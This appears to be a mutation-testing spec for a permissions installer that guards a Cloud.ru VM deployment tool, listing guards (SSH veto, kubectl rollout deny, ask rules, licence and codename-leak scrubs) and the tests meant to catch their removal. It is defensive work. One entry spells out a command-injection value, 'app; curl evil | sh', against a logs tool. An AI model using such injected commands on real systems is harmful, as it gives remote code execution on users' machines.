entries.property: The ADR-004 paid-step brake VETOES password-SSH to a Cloud.ru VM (sshpass fixture, exit 2) — deleting the regex lets the forbidden command through and the acid tests + the installer's executed probe must see it.
kubectl `rollout <mutating-subverb>` via mcp k8s_kubectl is denied on OUR side (the MEASURED upstream classifier hole, 05 §2.3) — disarming the guard re-opens unconfirmed prod restarts.
Every mutating tool is emitted under permissions.ask — an installer that stops emitting ask rules leaves paid tools one agent-call away (ADR-004 §1).

mutation.find: return { allow: expand(by.allow), ask: expand(by.ask), deny: expand(by.deny) };
mutation.replace: return { allow: expand(by.allow), ask: [], deny: expand(by.deny) };

entries.property: files[] is the exact whitelist of OUR artifacts — smuggling an engine dir into the publication contract must be caught by the pack-contents test (ADR-001: zero upstream bytes ship).

Post-grant (ADR-001 AM-2) the pack must REMAIN publishable — a stray private:true would silently kill every future publish while CI stays green, so the publishable-state assertion must go red on it. (The Grant-Confirmation URL protection itself lives in LICENSE, which the gate cannot mutate — extensionless file, no parser; its layer-1 coverage is the pack-holds LICENSE assertions plus the dz guard licence-hold rule, both reading LICENSE directly on every run/publish.)

The dz guard licence-hold rule triggers off package.json.licenseHold — the field deliberately STAYS post-grant (a satisfied hold passes with it in place); deleting it silently disarms the guard's LICENSE/NOTICES/SPDX verification on every future publish and must go red here.
package.json.license must equal the SPDX id of the actual LICENSE text (ADR-001 Confirmation: the field may never claim a licence the file does not carry).

stack_status ADVANCES a planned/running stack job server-side (handleStackStatus tools_stack.go:451 → advance :479-484 → s.callTool :220 invokes provision/pg_create/… — LIVE-REPRODUCED: one call moved a planned job planned→running and attempted provision, stopped only at AUTH_REQUIRED). Flipping it back to allow re-opens the zero-prompt paid chain stack_plan→stack_status and must go red (ADR-004 AM-1, cross-model QE HIGH).

logs concatenates its user-controlled `service` arg RAW into a remote `docker compose logs <service>` executed over SSH (handleLogs tools.go:1758 → engine/logs.go:61 `cmd += " " + opts.Service` → Deployer.Exec logs.go:64 → session.CombinedOutput internal/deploy/ssh.go:117), so service="app; curl evil | sh" is arbitrary RCE on the user's VM. Flipping it back to allow puts a zero-prompt command-injection path behind a SILENT allow and must go red (ADR-004 AM-2, shell-reach hazard axis, cross-model QE HIGH).

The compiler's positive codename invariant (no case-insensitive 'hermes' in ANY emitted file) is driven by data/dialects.json forbiddenCodenames — emptying the list disarms the net under the 8-token denylist (which alone let the bare codename survive 5x in the real-corpus compile, MEASURED) and the codename-gate tests must go red.

The engine config-dir leak form `.cloudru-vm` (dotted path) is scrubbed to `.cloudru-hub` by a targeted replacement (0.1.3 Variant A) — the bare token is NOT codename-gated because it is also the legitimate MCP server name (\bcloudru-vm\b over-blocks the compiler's own injected prose, PROVEN). Disarming the scrub re-ships the path leak with ok=true and the leak-scrub tests must go red.

The engine CLI-invocation leak form `cloudru-vm <real-engine-verb>` (finite verb set cited from engine cmd/cloudru-vm/main.go AddCommand, lines 53-65) is scrubbed to `cloudru-hub <verb>` without touching the MCP-server prose `cloudru-vm видны` (0.1.3 Variant A). Disarming the scrub re-ships the invocation leak and the leak-scrub + verb-set tests must go red.
The pointer-only section always carries the no-veto warning line (ADR-005: pointer without the warning is an illusion of support).
